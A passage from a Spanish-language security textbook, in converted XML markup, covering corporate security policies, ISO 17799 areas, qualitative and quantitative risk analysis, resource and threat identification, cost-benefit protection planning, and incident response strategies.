seguridad corporativa &#x2013; entendiendo por &#x2018;corporativa&#x2019; la aplicable a una determinada organizaci&#x00F3;n, bien
sea una empresa bien sea una universidad &#x2013;. Comentaremos desde aspectos relacionados con
la de&#xFB01;nici&#x00F3;n de pol&#x02CA;&#x0131;ticas o los an&#x00E1;lisis de riesgos hasta el papel del &#x00E1;rea de Seguridad de una
organizaci&#x00F3;n, incluyendo aproximaciones a la seguridad gestionada. Como siempre, existe numerosa
bibliograf&#x02CA;&#x0131;a sobre el tema que es imprescindible consultar si queremos de&#xFB01;nir y gestionar de
forma adecuada la seguridad de nuestra organizaci&#x00F3;n; especialmente recomendables son <citation>[?]</citation>, <citation>[?]</citation> y
<citation>[?]</citation>.
  </para></section><!--end section--><!--l. 98--><section 
role="section"><title><abbrev role="title-mark">22.2</abbrev><anchor 
   id="x1-33300022.2"  ></anchor>Pol&#x02CA;&#x0131;ticas de seguridad</title>
<!--l. 99--><para>  El t&#x00E9;rmino pol&#x02CA;&#x0131;tica de seguridad se suele de&#xFB01;nir como el conjunto de requisitos de&#xFB01;nidos por los
responsables directos o indirectos de un sistema que indica en t&#x00E9;rminos generales qu&#x00E9; est&#x00E1; y qu&#x00E9; no est&#x00E1;
permitido en el &#x00E1;rea de seguridad durante la operaci&#x00F3;n general de dicho sistema (<citation>[?]</citation>). Al tratarse de &#x2018;t&#x00E9;rminos
generales&#x2019;, aplicables a situaciones o recursos muy diversos, suele ser necesario re&#xFB01;nar los requisitos de
la pol&#x02CA;&#x0131;tica para convertirlos en indicaciones precisas de qu&#x00E9; es lo permitido y lo denegado en
cierta parte de la operaci&#x00F3;n del sistema, lo que se denomina pol&#x02CA;&#x0131;tica de aplicaci&#x00F3;n espec&#x02CA;&#x0131;&#xFB01;ca
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->Una pol&#x02CA;&#x0131;tica de seguridad puede ser prohibitiva, si todo lo que no est&#x00E1; expresamente permitido est&#x00E1;
denegado, o permisiva, si todo lo que no est&#x00E1; expresamente prohibido est&#x00E1; permitido. Evidentemente la
primera aproximaci&#x00F3;n es mucho mejor que la segunda de cara a mantener la seguridad de un sistema; en
este caso la pol&#x02CA;&#x0131;tica contemplar&#x02CA;&#x0131;a todas las actividades que se pueden realizar en los sistemas, y el resto &#x2013;
las no contempladas &#x2013; ser&#x02CA;&#x0131;an consideradas ilegales.
<!--br/-->
<!--br/-->Cualquier pol&#x02CA;&#x0131;tica ha de contemplar seis elementos claves en la seguridad de un sistema inform&#x00E1;tico
(<citation>[?]</citation>):
     </para><itemizedlist>
     <listitem>
     <!--l. 119--><para>Disponibilidad
     <!--br/-->Es  necesario  garantizar  que  los  recursos  del  sistema  se  encontrar&#x00E1;n  disponibles  cuando  se
     necesitan, especialmente la informaci&#x00F3;n cr&#x02CA;&#x0131;tica.
     </para></listitem>
     <listitem>
     <!--l. 122--><para>Utilidad
     <!--br/-->Los recursos del sistema y la informaci&#x00F3;n manejada en el mismo ha de ser &#x00FA;til para alguna
     funci&#x00F3;n.

     </para></listitem>
     <listitem>
     <!--l. 125--><para>Integridad
     <!--br/-->La  informaci&#x00F3;n  del  sistema  ha  de  estar  disponible  tal  y  como  se  almacen&#x00F3;  por  un  agente
     autorizado.
     </para></listitem>
     <listitem>
     <!--l. 128--><para>Autenticidad
     <!--br/-->El sistema ha de ser capaz de veri&#xFB01;car la identidad de sus usuarios, y los usuarios la del
     sistema.
     </para></listitem>
     <listitem>
     <!--l. 131--><para>Con&#xFB01;dencialidad
     <!--br/-->La  informaci&#x00F3;n  s&#x00F3;lo  ha  de  estar  disponible  para  agentes  autorizados,  especialmente  su
     propietario.
     </para></listitem>
     <listitem>
     <!--l. 134--><para>Posesi&#x00F3;n
     <!--br/-->Los propietarios de un sistema han de ser capaces de controlarlo en todo momento; perder
     este control en favor de un usuario malicioso compromete la seguridad del sistema hacia el
     resto de usuarios.</para></listitem></itemizedlist>
<!--l. 139--><para>Para cubrir de forma adecuada los seis elementos anteriores, con el objetivo permanente de garantizar la
seguridad corporativa, una pol&#x02CA;&#x0131;tica se suele dividir en puntos m&#x00E1;s concretos a veces llamados normativas
(aunque las de&#xFB01;niciones concretas de cada documento que conforma la infraestructura de nuestra pol&#x02CA;&#x0131;tica
de seguridad &#x2013; pol&#x02CA;&#x0131;tica, normativa, est&#x00E1;ndar, procedimiento operativo&#x2026;&#x2013; es algo en lo que ni los
propios expertos se ponen de acuerdo). El est&#x00E1;ndar ISO 17799 (<citation>[?]</citation>) de&#xFB01;ne las siguientes l&#x02CA;&#x0131;neas de
actuaci&#x00F3;n:
     </para><itemizedlist>
     <listitem>
     <!--l. 149--><para>Seguridad organizacional.
     <!--br/-->Aspectos  relativos  a  la  gesti&#x00F3;n  de  la  seguridad  dentro  de  la  organizaci&#x00F3;n  (cooperaci&#x00F3;n  con
     elementos externos, outsourcing, estructura del &#x00E1;rea de seguridad&#x2026;).
     </para></listitem>
     <listitem>
     <!--l. 153--><para>Clasi&#xFB01;caci&#x00F3;n y control de activos.
     <!--br/-->Inventario  de  activos  y  de&#xFB01;nici&#x00F3;n  de  sus  mecanismos  de  control,  as&#x02CA;&#x0131; como  etiquetado  y
     clasi&#xFB01;caci&#x00F3;n de la informaci&#x00F3;n corporativa.
     </para></listitem>
     <listitem>
     <!--l. 156--><para>Seguridad del personal.
     <!--br/-->Formaci&#x00F3;n  en  materias  de  seguridad,  clausulas  de  con&#xFB01;dencialidad,  reporte  de  incidentes,
     monitorizaci&#x00F3;n de personal&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 159--><para>Seguridad f&#x02CA;&#x0131;sica y del entorno.
     <!--br/-->Bajo este punto se engloban aspectos relativos a la seguridad f&#x02CA;&#x0131;sica de los recintos donde
     se encuentran los diferentes recursos &#x2013; incluyendo los humanos &#x2013; de la organizaci&#x00F3;n y de los
     sistemas en s&#x02CA;&#x0131;, as&#x02CA;&#x0131; como la de&#xFB01;nici&#x00F3;n de controles gen&#x00E9;ricos de seguridad.

     </para></listitem>
     <listitem>
     <!--l. 164--><para>Gesti&#x00F3;n de comunicaciones y operaciones.
     <!--br/-->Este es uno de los puntos m&#x00E1;s interesantes desde un punto de vista estrictamente t&#x00E9;cnico, ya que
     engloba aspectos de la seguridad relativos a la operaci&#x00F3;n de los sistemas y telecomunicaciones,
     como los controles de red, la protecci&#x00F3;n frente a malware, la gesti&#x00F3;n de copias de seguridad o el
     intercambio de software dentro de la organizaci&#x00F3;n.
     </para></listitem>
     <listitem>
     <!--l. 170--><para>Controles de acceso.
     <!--br/-->De&#xFB01;nici&#x00F3;n y gesti&#x00F3;n de puntos de control de acceso a los recursos inform&#x00E1;ticos de la organizaci&#x00F3;n:
     contrase~nas, seguridad perimetral, monitorizaci&#x00F3;n de accesos&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 174--><para>Desarrollo y mantenimiento de sistemas.
     <!--br/-->Seguridad en el desarrollo y las aplicaciones, cifrado de datos, control de software&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 177--><para>Gesti&#x00F3;n de continuidad de negocio.
     <!--br/-->De&#xFB01;nici&#x00F3;n de planes de continuidad, an&#x00E1;lisis de impacto, simulacros de cat&#x00E1;strofes&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 180--><para>Requisitos legales.
     <!--br/-->Evidentemente, una pol&#x02CA;&#x0131;tica ha de cumplir con la normativa vigente en el pa&#x02CA;&#x0131;s donde se aplica;
     si una organizaci&#x00F3;n se extiende a lo largo de diferentes paises, su pol&#x02CA;&#x0131;tica tiene que ser coherente
     con la normativa del m&#x00E1;s restrictivo de ellos. En este apartado de la pol&#x02CA;&#x0131;ica se establecen las
     relaciones con cada ley: derechos de propiedad intelectual, tratamiento de datos de car&#x00E1;cter
     personal, exportaci&#x00F3;n de cifrado&#x2026;junto a todos los aspectos relacionados con registros de eventos
     en los recursos (logs) y su mantenimiento.</para></listitem></itemizedlist>
<!--l. 190--><para>
  </para></section><!--end section--><!--l. 190--><section 
role="section"><title><abbrev role="title-mark">22.3</abbrev><anchor 
   id="x1-33400022.3"  ></anchor>An&#x00E1;lisis de riesgos</title>
<!--l. 191--><para>  En un entorno inform&#x00E1;tico existen una serie de recursos (humanos, t&#x00E9;cnicos, de infraestructura&#x2026;) que est&#x00E1;n
expuestos a diferentes tipos de riesgos: los &#x2018;normales&#x2019;, aquellos comunes a cualquier entorno, y los
excepcionales, originados por situaciones concretas que afectan o pueden afectar a parte de una
organizaci&#x00F3;n o a toda la misma, como la inestabilidad pol&#x02CA;&#x0131;tica en un pa&#x02CA;&#x0131;s o una regi&#x00F3;n sensible a terremotos
(<citation>[?]</citation>). Para tratar de minimizar los efectos de un problema de seguridad se realiza lo que denominamos un
an&#x00E1;lisis de riesgos, t&#x00E9;rmino que hace referencia al proceso necesario para responder a tres cuestiones b&#x00E1;sicas
sobre nuestra seguridad:
     </para><itemizedlist>
     <listitem>
     <!--l. 202--><para>&#x00BF;qu&#x00E9; queremos proteger?
     </para></listitem>
     <listitem>
     <!--l. 203--><para>&#x00BF;contra qui&#x00E9;n o qu&#x00E9; lo queremos proteger?
     </para></listitem>
     <listitem>
     <!--l. 204--><para>&#x00BF;c&#x00F3;mo lo queremos proteger?</para></listitem></itemizedlist>

<!--l. 206--><para>En la pr&#x00E1;ctica existen dos aproximaciones para responder a estas cuestiones, una cuantitativa y otra
cualitativa. La primera de ellas es con diferencia la menos usada, ya que en muchos casos implica c&#x00E1;lculos
complejos o datos dif&#x02CA;&#x0131;ciles de estimar. Se basa en dos par&#x00E1;metros fundamentales: la probabilidad de que un
suceso ocurra y una estimaci&#x00F3;n del coste o las p&#x00E9;rdidas en caso de que as&#x02CA;&#x0131; sea; el producto de ambos t&#x00E9;rminos
es lo que se denomina coste anual estimado (EAC, Estimated Annual Cost), y aunque te&#x00F3;ricamente es
posible conocer el riesgo de cualquier evento (el EAC) y tomar decisiones en funci&#x00F3;n de estos datos, en la
pr&#x00E1;ctica la inexactitud en la estimaci&#x00F3;n o en el c&#x00E1;lculo de par&#x00E1;metros hace dif&#x02CA;&#x0131;cil y poco realista esta
aproximaci&#x00F3;n.
<!--br/-->
<!--br/-->El segundo m&#x00E9;todo de an&#x00E1;lisis de riesgos es el cualitativo, de uso muy difundido en la actualidad
especialmente entre las nuevas &#x2018;consultoras&#x2019; de seguridad (aquellas m&#x00E1;s especializadas en seguridad l&#x00F3;gica,
cortafuegos, tests de penetraci&#x00F3;n y similares). Es mucho m&#x00E1;s sencillo e intuitivo que el anterior, ya que ahora
no entran en juego probabilidades exactas sino simplemente una estimaci&#x00F3;n de p&#x00E9;rdidas potenciales. Para
ello se interrelacionan cuatro elementos principales: las amenazas, por de&#xFB01;nici&#x00F3;n siempre presentes en
cualquier sistema, las vulnerabilidades, que potencian el efecto de las amenazas, el impacto asociado a una
amenaza, que indica los da~nos sobre un activo por la materializaci&#x00F3;n de dicha amenaza, y los controles o
salvaguardas, contramedidas para minimizar las vulnerabilidades (controles preventivos) o el impacto
(controles curativos). Por ejemplo, una amenaza ser&#x02CA;&#x0131;a un pirata que queramos o no (no depende de
nosotros) va a tratar de modi&#xFB01;car nuestra p&#x00E1;gina web principal, el impacto ser&#x02CA;&#x0131;a una medida del da~no
que causar&#x02CA;&#x0131;a si lo lograra, una vulnerabilidad ser&#x02CA;&#x0131;a una con&#xFB01;guraci&#x00F3;n incorrecta del servidor
que ofrece las p&#x00E1;ginas, y un control la recon&#xFB01;guraci&#x00F3;n de dicho servidor o el incremento de su
nivel de parcheado. Con estos cuatro elementos podemos obtener un indicador cualitativo
del nivel de riesgo asociado a un activo determinado dentro de la organizaci&#x00F3;n, visto como la
probabilidad de que una amenaza se materialice sobre un activo y produzca un determinado
impacto.
<!--br/-->
<!--br/-->En Espa~na es interesante la metodolog&#x02CA;&#x0131;a de an&#x00E1;lisis de riesgos desarrollada desde el Consejo Superior de
Inform&#x00E1;tica (Ministerio de Administraciones P&#x00FA;blicas) y denominada MAGERIT (Metodolog&#x02CA;&#x0131;a
de An&#x00E1;lisis y GEsti&#x00F3;n de Riesgos de los sistemas de Informaci&#x00F3;n de las AdminisTraciones
p&#x00FA;blicas); se trata de un m&#x00E9;todo formal para realizar un an&#x00E1;lisis de riesgos y recomendar los
controles necesarios para su minimizaci&#x00F3;n. MAGERIT se basa en una aproximaci&#x00F3;n cualitativa
que intenta cubrir un amplio espectro de usuarios gen&#x00E9;ricos gracias a un enfoque orientado a
la adaptaci&#x00F3;n del mecanismo dentro de diferentes entornos, generalmente con necesidades de
seguridad y nivel de sensibilidad tambi&#x00E9;n diferentes. En la p&#x00E1;gina web del Consejo Superior de
Inform&#x00E1;tica <anchor 
   id="x1-334001f2"  ></anchor><footnote><para>     http://www.map.es/csi/</para></footnote>
podemos encontrar informaci&#x00F3;n m&#x00E1;s detallada acerca de esta metodolog&#x02CA;&#x0131;a, as&#x02CA;&#x0131; como algunos ejemplos de
ejecuci&#x00F3;n de la misma.
<!--br/-->
<!--br/-->Tras obtener mediante cualquier mecanismo los indicadores de riesgo en nuestra organizaci&#x00F3;n llega la hora
de evaluarlos para tomar decisiones organizativas acerca de la gesti&#x00F3;n de nuestra seguridad y sus
prioridades. Tenemos por una parte el riesgo calculado, resultante de nuestro an&#x00E1;lisis, y este riesgo
calculado se ha de comparar con un cierto umbral (umbral de riesgo) determinado por la pol&#x02CA;&#x0131;tica de
seguridad de nuestra organizaci&#x00F3;n; el umbral de riesgo puede ser o bien un n&#x00FA;mero o bien una etiqueta de
riesgo (por ejemplo, nivel de amenaza alto, impacto alto, vulnerabilidad grave, etc.), y cualquier riesgo
calculado superior al umbral ha de implicar una decisi&#x00F3;n de reducci&#x00F3;n de riesgo. Si por el contrario el
calculado es menor que el umbral, se habla de riesgo residual, y el mismo se considera asumible (no hay
porqu&#x00E9; tomar medidas para reducirlo). El concepto de asumible es diferente al de riesgo asumido, que
denota aquellos riesgos calculados superiores al umbral pero sobre los que por cualquier raz&#x00F3;n (pol&#x02CA;&#x0131;tica,
econ&#x00F3;mica&#x2026;) se decide no tomar medidas de reducci&#x00F3;n; evidentemente, siempre hemos de huir de esta
situaci&#x00F3;n.
<!--br/-->
<!--br/-->Una vez conocidos y evaluados de cualquier forma los riesgos a los que nos enfrentamos podremos de&#xFB01;nir
las pol&#x02CA;&#x0131;ticas e implementar las soluciones pr&#x00E1;cticas &#x2013; los mecanismos &#x2013; para minimizar sus efectos. Vamos a
intentar de entrar con m&#x00E1;s detalle en c&#x00F3;mo dar respuesta a cada una de las preguntas que nos hemos
planteado al principio de este punto:

  </para><!--l. 273--><section 
role="subsection"><title><abbrev role="title-mark">22.3.1</abbrev><anchor 
   id="x1-33500022.3.1"  ></anchor>Identi&#xFB01;caci&#x00F3;n de recursos</title>
<!--l. 274--><para>  Debemos identi&#xFB01;car todos los recursos cuya integridad pueda ser amenazada de cualquier forma; por
ejemplo, <citation>[?]</citation> de&#xFB01;ne b&#x00E1;sicamente los siguientes:
     </para><itemizedlist>
     <listitem>
     <!--l. 278--><para>Hardware
     <!--br/-->Procesadores, tarjetas, teclados, terminales, estaciones de trabajo, ordenadores personales,
     impresoras, unidades de disco, l&#x02CA;&#x0131;neas de comunicaci&#x00F3;n, servidores, routers&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 282--><para>Software
     <!--br/-->C&#x00F3;digos fuente y objeto, utilidades, programas de diagn&#x00F3;stico, sistemas operativos, programas
     de comunicaci&#x00F3;n&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 285--><para>Informaci&#x00F3;n
     <!--br/-->En ejecuci&#x00F3;n, almacenados en l&#x02CA;&#x0131;nea, almacenados fuera de l&#x02CA;&#x0131;nea, en comunicaci&#x00F3;n, bases de
     datos&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 288--><para>Personas
     <!--br/-->Usuarios, operadores&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 290--><para>Accesorios
     <!--br/-->Papel, cintas, t&#x00F3;ners&#x2026;</para></listitem></itemizedlist>
<!--l. 293--><para>Aparte del recurso en s&#x02CA;&#x0131; (algo tangible, como un router) hemos de considerar la visi&#x00F3;n intangible de cada uno
de estos recursos (por ejemplo la capacidad para seguir trabajando sin ese router). Es dif&#x02CA;&#x0131;cil generar estos
aspectos intangibles de los recursos, ya que es algo que va a depender de cada organizaci&#x00F3;n, su
funcionamiento, sus seguros, sus normas&#x2026;No obstante, siempre hemos de tener en cuenta algunos aspectos
comunes: privacidad de los usuarios, imagen p&#x00FA;blica de la organizaci&#x00F3;n, reputaci&#x00F3;n, satisfacci&#x00F3;n del personal y
de los clientes &#x2013; en el caso de una universidad, de los alumnos &#x2013;, capacidad de procesamiento ante un
fallo&#x2026;
<!--br/-->
<!--br/-->Con los recursos correctamente identi&#xFB01;cados se ha de generar una lista &#xFB01;nal, que ya incluir&#x00E1; todo lo que
necesitamos proteger en nuestra organizaci&#x00F3;n.
  </para></section><!--end subsection--><!--l. 306--><section 
role="subsection"><title><abbrev role="title-mark">22.3.2</abbrev><anchor 
   id="x1-33600022.3.2"  ></anchor>Identi&#xFB01;caci&#x00F3;n de amenazas</title>
<!--l. 307--><para>  Una vez conocemos los recursos que debemos proteger es la hora de identi&#xFB01;car las vulnerabilidades y
amenazas que se ciernen contra ellos. Una vulnerabilidad es cualquier situaci&#x00F3;n que pueda desembocar en
un problema de seguridad, y una amenaza es la acci&#x00F3;n espec&#x02CA;&#x0131;&#xFB01;ca que aprovecha una vulnerabilidad para
crear un problema de seguridad; entre ambas existe una estrecha relaci&#x00F3;n: sin vulnerabilidades no hay
amenazas, y sin amenazas no hay vulnerabilidades.
<!--br/-->
<!--br/-->Se suelen dividir las amenazas que existen sobre los sistemas inform&#x00E1;ticos en tres grandes grupos, en funci&#x00F3;n
del &#x00E1;mbito o la forma en que se pueden producir:
     </para><itemizedlist>
     <listitem>

     <!--l. 317--><para>Desastres del entorno.
     <!--br/-->Dentro de este grupo se incluyen todos los posibles problemas relacionados con la ubicaci&#x00F3;n
     del entorno de trabajo inform&#x00E1;tico o de la propia organizaci&#x00F3;n, as&#x02CA;&#x0131; como con las personas que
     de una u otra forma est&#x00E1;n relacionadas con el mismo. Por ejemplo, se han de tener en cuenta
     desastres naturales (terremotos, inundaciones&#x2026;), desastres producidos por elementos cercanos,
     como los cortes de &#xFB02;uido el&#x00E9;ctrico, y peligros relacionados con operadores, programadores o
     usuarios del sistema.
     </para></listitem>
     <listitem>
     <!--l. 325--><para>Amenazas en el sistema.
     <!--br/-->Bajo esta denominaci&#x00F3;n se contemplan todas las vulnerabilidades de los equipos y su software
     que pueden acarrear amenazas a la seguridad, como fallos en el sistema operativo, medidas
     de protecci&#x00F3;n que &#x00E9;ste ofrece, fallos en los programas, copias de seguridad&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 330--><para>Amenazas en la red.
     <!--br/-->Cada d&#x02CA;&#x0131;a es menos com&#x00FA;n que una m&#x00E1;quina trabaje aislada de todas las dem&#x00E1;s; se tiende a
     comunicar equipos mediante redes locales, intranets o la propia Internet, y esta interconexi&#x00F3;n
     acarrea nuevas &#x2013; y peligrosas &#x2013; amenazas a la seguridad de los equipos, peligros que hasta
     el momento de la conexi&#x00F3;n no se suelen tener en cuenta. Por ejemplo, es necesario analizar
     aspectos relativos al cifrado de los datos en tr&#x00E1;nsito por la red, a proteger una red local del resto
     de internet, o a instalar sistemas de autenticaci&#x00F3;n de usuarios remotos que necesitan acceder a
     ciertos recursos internos a la organizaci&#x00F3;n (como un investigador que conecta desde su casa a
     trav&#x00E9;s de un m&#x00F3;dem).</para></listitem></itemizedlist>
<!--l. 342--><para>Algo importante a la hora de analizar las amenazas a las que se enfrentan nuestros sistemas es analizar los
potenciales tipos de atacantes que pueden intentar violar nuestra seguridad. Es algo normal que a la
hora de hablar de atacantes todo el mundo piense en crackers, en piratas inform&#x00E1;ticos mal
llamados hackers. No obstante, esto no es m&#x00E1;s que el fruto de la repercusi&#x00F3;n que en todos los
medios tienen estos individuos y sus acciones; en realidad, la inmensa mayor&#x02CA;&#x0131;a de problemas
de seguridad vienen dados por atacantes internos a la organizaci&#x00F3;n afectada. En organismos
de I+D estos atacantes suelen ser los propios estudiantes (rara vez el personal), as&#x02CA;&#x0131; como
piratas externos a la entidad que aprovechan la habitualmente mala protecci&#x00F3;n de los sistemas
universitarios para acceder a ellos y conseguir as&#x02CA;&#x0131; cierto status social dentro de un grupo de piratas.
Los conocimientos de estas personas en materias de sistemas operativos, redes o seguridad
inform&#x00E1;tica suelen ser muy limitados, y sus actividades no suelen entra~nar muchos riesgos a
no ser que se utilicen nuestros equipos para atacar a otras organizaciones, en cuyo caso a
los posibles problemas legales hay que sumar la mala imagen que nuestras organizaciones
adquieren.
<!--br/-->
<!--br/-->No siempre hemos de contemplar a las amenazas como actos intencionados contra nuestro
sistema: muchos de los problemas pueden ser ocasionados por accidentes, desde un operador
que derrama una taza de caf&#x00E9; sobre una terminal hasta un usuario que tropieza con el cable
de alimentaci&#x00F3;n de un servidor y lo desconecta de la l&#x02CA;&#x0131;nea el&#x00E9;ctrica, pasando por temas como
el borrado accidental de datos o los errores de programaci&#x00F3;n; decir &#x2018;no lo hice a prop&#x00F3;sito&#x2019; no
ayuda nada en estos casos. Por supuesto, tampoco tenemos que reducirnos a los accesos no
autorizados al sistema: un usuario de nuestras m&#x00E1;quinas puede intentar conseguir privilegios que no
le corresponden, una persona externa a la organizaci&#x00F3;n puede lanzar un ataque de negaci&#x00F3;n
de servicio contra la misma sin necesidad de conocer ni siquiera un login y una contrase~na,
etc.
  </para></section><!--end subsection--><!--l. 371--><section 
role="subsection"><title><abbrev role="title-mark">22.3.3</abbrev><anchor 
   id="x1-33700022.3.3"  ></anchor>Medidas de protecci&#x00F3;n</title>
<!--l. 372--><para>  Tras identi&#xFB01;car todos los recursos que deseamos proteger, as&#x02CA;&#x0131; como las posibles vulnerabilidades y
amenazas a que nos exponemos y los potenciales atacantes que pueden intentar violar nuestra seguridad,

hemos de estudiar c&#x00F3;mo proteger nuestros sistemas, sin ofrecer a&#x00FA;n implementaciones concretas para
protegerlos (esto ya no ser&#x02CA;&#x0131;an pol&#x02CA;&#x0131;ticas sino mecanismos). Esto implica en primer lugar cuanti&#xFB01;car los
da~nos que cada posible vulnerabilidad puede causar teniendo en cuenta las posibilidades de que
una amenaza se pueda convertir en realidad. Este c&#x00E1;lculo puede realizarse partiendo de hechos
sucedidos con anterioridad en nuestra organizaci&#x00F3;n, aunque por desgracia en muchos lugares no
se suelen registrar los incidentes acaecidos. En este caso, y tambi&#x00E9;n a la hora de evaluar los
da~nos sobre recursos intangibles, existen diversas aproximaciones como el m&#x00E9;todo Delphi, que
b&#x00E1;sicamente consiste en preguntar a una serie de especialistas de la organizaci&#x00F3;n sobre el da~no y las
p&#x00E9;rdidas que cierto problema puede causar; no obstante, la experiencia del administrador en
materias de seguridad suele tener aqu&#x02CA;&#x0131; la &#x00FA;ltima palabra a la hora de evaluar los impactos de cada
amenaza.
<!--br/-->
<!--br/-->La clasi&#xFB01;caci&#x00F3;n de riesgos de cara a estudiar medidas de protecci&#x00F3;n suele realizarse en base al nivel de
importancia del da~no causado y a la probabilidad aproximada de que ese da~no se convierta en realidad; se
trata principalmente de no gastar m&#x00E1;s dinero en una implementaci&#x00F3;n para proteger un recurso de lo que vale
dicho recurso o de lo que nos costar&#x02CA;&#x0131;a recuperarnos de un da~no en &#x00E9;l o de su p&#x00E9;rdida total. Por ejemplo,
podemos seguir un an&#x00E1;lisis similar en algunos aspectos al problema de la mochila: llamamos <informalequation><graphic 
fileref="unixsec543x.gif"></graphic></informalequation> al riesgo
de perder un recurso i (a la probabilidad de que se produzca un ataque), y le asignamos un
valor de 0 a 10 (valores m&#x00E1;s altos implican m&#x00E1;s probabilidad); de la misma forma, de&#xFB01;nimos
tambi&#x00E9;n de 0 a 10 la importancia de cada recurso, <informalequation><graphic 
fileref="unixsec544x.gif"></graphic></informalequation>, siendo 10 la importancia m&#x00E1;s alta. La
evaluaci&#x00F3;n del riesgo es entonces el producto de ambos valores, llamado peso o riesgo evaluado
de un recurso, <informalequation><graphic 
fileref="unixsec545x.gif"></graphic></informalequation>, y medido en dinero perdido por unidad de tiempo (generalmente, por
a~no):
</para><section role="center"><title/>
<!--l. 403--><para> <informalequation><graphic 
fileref="unixsec546x.gif"></graphic></informalequation></para></section>
<!--l. 406--><para>De esta forma podemos utilizar hojas de trabajo en las que, para cada recurso, se muestre su nombre y el
n&#x00FA;mero asignado, as&#x02CA;&#x0131; como los tres valores anteriores. Evidentemente, los recursos que presenten un riesgo
evaluado mayor ser&#x00E1;n los que m&#x00E1;s medidas de protecci&#x00F3;n deben poseer, ya que esto signi&#xFB01;ca que es probable
que sean atacados, y que adem&#x00E1;s el ataque puede causar p&#x00E9;rdidas importantes. Es especialmente importante
un grupo de riesgos denominados inaceptables, aquellos cuyo peso supera un cierto umbral; se trata de
problemas que no nos podemos permitir en nuestros sistemas, por lo que su prevenci&#x00F3;n es crucial para que
todo funcione correctamente.
<!--br/-->
<!--br/-->Una vez que conocemos el riesgo evaluado de cada recurso es necesario efectuar lo que se llama el an&#x00E1;lisis
de costes y bene&#xFB01;cios. B&#x00E1;sicamente consiste en comparar el coste asociado a cada problema (calculado
anteriormente, <informalequation><graphic 
fileref="unixsec547x.gif"></graphic></informalequation>) con el coste de prevenir dicho problema. El c&#x00E1;lculo de este &#x00FA;ltimo no suele ser complejo
si conocemos las posibles medidas de prevenci&#x00F3;n que tenemos a nuestra disposici&#x00F3;n: por ejemplo,
para saber lo que nos cuesta prevenir los efectos de un incendio en la sala de operaciones, no
tenemos m&#x00E1;s que consultar los precios de sistemas de extinci&#x00F3;n de fuego, o para saber lo que
nos cuesta proteger nuestra red s&#x00F3;lo hemos de ver los precios de productos como routers que
bloqueen paquetes o cortafuegos completos. No s&#x00F3;lo hemos de tener en cuenta el coste de cierta
protecci&#x00F3;n, sino tambi&#x00E9;n lo que nos puede suponer su implementaci&#x00F3;n y su mantenimiento; en
muchos casos existen soluciones gratuitas para prevenir ciertas amenazas, pero estas soluciones
tienen un coste asociado relativo a la di&#xFB01;cultad de hacerlas funcionar correctamente de una
forma cont&#x02CA;&#x0131;nua en el tiempo, por ejemplo dedicando a un empleado a su implementaci&#x00F3;n y
mantenimiento.
<!--br/-->
<!--br/-->Cuando ya hemos realizado este an&#x00E1;lisis no tenemos m&#x00E1;s que presentar nuestras cuentas a los responsables
de la organizaci&#x00F3;n (o adecuarlas al presupuesto que un departamento destina a materias de seguridad),
siempre teniendo en cuenta que el gasto de proteger un recurso ante una amenaza ha de ser inferior al
gasto que se producir&#x02CA;&#x0131;a si la amenaza se convirtiera en realidad. Hemos de tener siempre presente que los
riesgos se pueden minimizar, pero nunca eliminarlos completamente, por lo que ser&#x00E1; recomendable
plani&#xFB01;car no s&#x00F3;lo la prevenci&#x00F3;n ante de un problema sino tambi&#x00E9;n la recuperaci&#x00F3;n si el mismo se produce; se
suele hablar de medidas proactivas (aquellas que se toman para prevenir un problema) y
medidas reactivas (aquellas que se toman cuando el da~no se produce, para minimizar sus

efectos).
  </para></section><!--end subsection--></section><!--end section--><!--l. 443--><section 
role="section"><title><abbrev role="title-mark">22.4</abbrev><anchor 
   id="x1-33800022.4"  ></anchor>Estrategias de respuesta</title>
<!--l. 444--><para>  &#x00BF;Qu&#x00E9; hacer cuando nuestra pol&#x02CA;&#x0131;tica de seguridad ha sido violada? La respuesta a esta pregunta depende
completamente del tipo de violaci&#x00F3;n que se haya producido, de su gravedad, de qui&#x00E9;n la haya provocado, de
su intenci&#x00F3;n&#x2026;Si se trata de accidentes o de problemas poco importantes suele ser su&#xFB01;ciente con una
reprimenda verbal o una advertencia; si ha sido un hecho provocado, quiz&#x00E1;s es conveniente emprender
acciones algo m&#x00E1;s convincentes, como la clausura de las cuentas de forma temporal o peque~nas sanciones
administrativas. En el caso de problemas graves que hayan sido intencionados interesar&#x00E1; emprender
acciones m&#x00E1;s duras, como cargos legales o sanciones administrativas &#xFB01;rmes (por ejemplo, la expulsi&#x00F3;n de una
universidad).
<!--br/-->
<!--br/-->Una gran limitaci&#x00F3;n que nos va a afectar mucho es la situaci&#x00F3;n de la persona o personas causantes de la
violaci&#x00F3;n con respecto a la organizaci&#x00F3;n que la ha sufrido. En estos casos se suele diferenciar entre usuarios
internos o locales, que son aquellos pertenecientes a la propia organizaci&#x00F3;n, y externos, los que no est&#x00E1;n
relacionados directamente con la misma; las diferencias entre ellos son los l&#x02CA;&#x0131;mites de red, los
administrativos, los legales o los pol&#x02CA;&#x0131;ticos. Evidentemente es mucho m&#x00E1;s f&#x00E1;cil buscar responsabilidades ante
una violaci&#x00F3;n de la seguridad entre los usuarios internos, ya sea contra la propia organizaci&#x00F3;n o contra
otra, pero utilizando los recursos de la nuestra; cuando estos casos se dan en redes de I+D,
generalmente ni siquiera es necesario llevar el caso ante la justicia, basta con la aplicaci&#x00F3;n de
ciertas normas sobre el usuario problem&#x00E1;tico (desde una sanci&#x00F3;n hasta la expulsi&#x00F3;n o despido de la
organizaci&#x00F3;n).
<!--br/-->
<!--br/-->Existen dos estrategias de respuesta ante un incidente de seguridad (<citation>[?]</citation>):
     </para><itemizedlist>
     <listitem>
     <!--l. 471--><para>Proteger y proceder.
     </para></listitem>
     <listitem>
     <!--l. 472--><para>Perseguir y procesar.</para></listitem></itemizedlist>
<!--l. 474--><para>La primera de estas estrategias, proteger y proceder, se suele aplicar cuando la organizaci&#x00F3;n es muy
vulnerable o el nivel de los atacantes es elevado; la &#xFB01;losof&#x02CA;&#x0131;a es proteger de manera inmediata la red y los
sistemas y restaurar su estado normal, de forma que los usuarios puedan seguir trabajando normalmente.
